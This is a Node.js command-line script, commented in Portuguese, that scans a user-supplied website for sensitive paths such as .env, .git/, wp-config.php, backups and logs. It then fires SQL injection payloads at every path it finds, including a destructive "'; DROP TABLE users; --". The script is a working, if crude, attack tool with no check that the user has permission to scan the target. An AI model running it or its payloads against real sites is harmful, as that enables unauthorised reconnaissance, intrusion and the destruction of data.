const axios = require("axios");
const readline = require("readline");

// Lista de diretórios e arquivos sensíveis comuns
const commonPaths = [
  "admin/",
  "login/",
  "backup/",
  "config/",
  "db/",
  ".git/",
  ".env",
  "wp-admin/",
  "wp-config.php",
  "phpinfo.php",
  "robots.txt",
  "sitemap.xml",
  "test/",
  "uploads/",
  "logs/",
  "error.log",
];

// Payloads básicos usados para testar SQL Injection
const sqlPayloads = [
  "' OR '1'='1",
  "' AND '1'='2",
  "' UNION SELECT null--",
  "'; DROP TABLE users; --",
];

// Relatório final
const report = {
  foundPaths: [], // Diretórios/arquivos encontrados
  sqlInjectionVulnerable: [], // URLs vulneráveis a SQL Injection
};

// Função para verificar vulnerabilidade de SQL Injection em uma URL
async function checkSQLInjection(url) {
  console.log(`\n🔍 Verificando vulnerabilidade de SQL Injection na URL: ${url}`);

  for (const payload of sqlPayloads) {
    try {
      const testUrl = `${url}?input=${encodeURIComponent(payload)}`;
      console.log(`Testando payload: ${payload}`);

      // Faz a requisição GET para a URL com o payload
      const response = await axios.get(testUrl);

      // Verifica se há mensagens típicas de erro de SQL
      if (
        response.data.includes("SQL syntax") ||
        response.data.includes("mysql_fetch") ||
        response.data.includes("Unclosed quotation") ||
        response.data.includes("You have an error in your SQL syntax")
      ) {
        console.log(`⚠️ Possível vulnerabilidade encontrada com o payload: ${payload}`);
        report.sqlInjectionVulnerable.push(url); // Adiciona a URL ao relatório
        return true;
      }
    } catch (error) {
      console.error(`Erro ao testar payload: ${payload}. Detalhes: ${error.message}`);
    }
  }

  console.log("✅ Nenhuma vulnerabilidade de SQL Injection foi detectada.");
  return false;
}

// Função para escanear diretórios e testar SQL Injection
async function scanAndTest(url) {
  console.log(`\n🔍 Iniciando scanner de diretórios/arquivos sensíveis na URL base: ${url}\n`);

  for (const path of commonPaths) {
    const testUrl = `${url.replace(/\/$/, "")}/${path}`; // Garante que a URL não termine com "/"
    try {
      console.log(`Testando: ${testUrl}`);
      const response = await axios.get(testUrl, { validateStatus: false });

      if (response.status === 200 || response.status === 403) {
        const status = response.status === 200 ? "200 OK" : "403 Forbidden";
        console.log(`⚠️ Encontrado: ${testUrl} (Status: ${status})`);
        report.foundPaths.push({ url: testUrl, status }); // Adiciona ao relatório

        // Testa SQL Injection no diretório/arquivo encontrado
        const sqlInjectionDetected = await checkSQLInjection(testUrl);
        if (sqlInjectionDetected) {
          console.log(`🚨 Vulnerabilidade de SQL Injection detectada em: ${testUrl}`);
        }
      }
    } catch (error) {
      console.error(`Erro ao acessar ${testUrl}: ${error.message}`);
    }
  }

  console.log("\n✅ Scanner de diretórios e teste de SQL Injection concluídos.");
}

// Exibir relatório final
function displayReport() {
  console.log("\n📋 RELATÓRIO FINAL 📋\n");

  console.log("🔍 Diretórios/arquivos encontrados:");
  if (report.foundPaths.length === 0) {
    console.log("Nenhum diretório ou arquivo sensível foi encontrado.");
  } else {
    report.foundPaths.forEach((path) =>
      console.log(`- ${path.url} (Status: ${path.status})`)
    );
  }

  console.log("\n🔍 URLs vulneráveis a SQL Injection:");
  if (report.sqlInjectionVulnerable.length === 0) {
    console.log("Nenhuma vulnerabilidade de SQL Injection foi detectada.");
  } else {
    report.sqlInjectionVulnerable.forEach((url) => console.log(`- ${url}`));
  }

  console.log("\n✅ Fim do relatório.");
}

// Menu principal
function mainMenu() {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  console.log("\nSelecione uma opção:");
  console.log("1 - Fazer scanner de diretórios e testar SQL Injection.");
  console.log("2 - Testar SQL Injection em um caminho específico.\n");

  rl.question("Digite o número da opção desejada: ", (option) => {
    switch (option) {
      case "1":
        rl.question("\nDigite a URL do site para escanear: ", (url) => {
          if (!url.startsWith("http://") && !url.startsWith("https://")) {
            console.log("⚠️ Por favor, insira uma URL válida (começando com http:// ou https://).");
            rl.close();
            return;
          }

          scanAndTest(url)
            .then(() => {
              displayReport(); // Exibe o relatório final
              rl.close();
            })
            .catch((err) => {
              console.error("Erro durante o scanner:", err.message);
              rl.close();
            });
        });
        break;

      case "2":
        rl.question("\nDigite o caminho específico para testar SQL Injection: ", (url) => {
          if (!url.startsWith("http://") && !url.startsWith("https://")) {
            console.log("⚠️ Por favor, insira uma URL válida (começando com http:// ou https://).");
            rl.close();
            return;
          }

          checkSQLInjection(url)
            .then(() => rl.close())
            .catch((err) => {
              console.error("Erro durante o teste:", err.message);
              rl.close();
            });
        });
        break;

      default:
        console.log("⚠️ Opção inválida. Tente novamente.");
        rl.close();
        mainMenu(); // Reinicia o menu
    }
  });
}

// Inicia o menu principal
mainMenu();
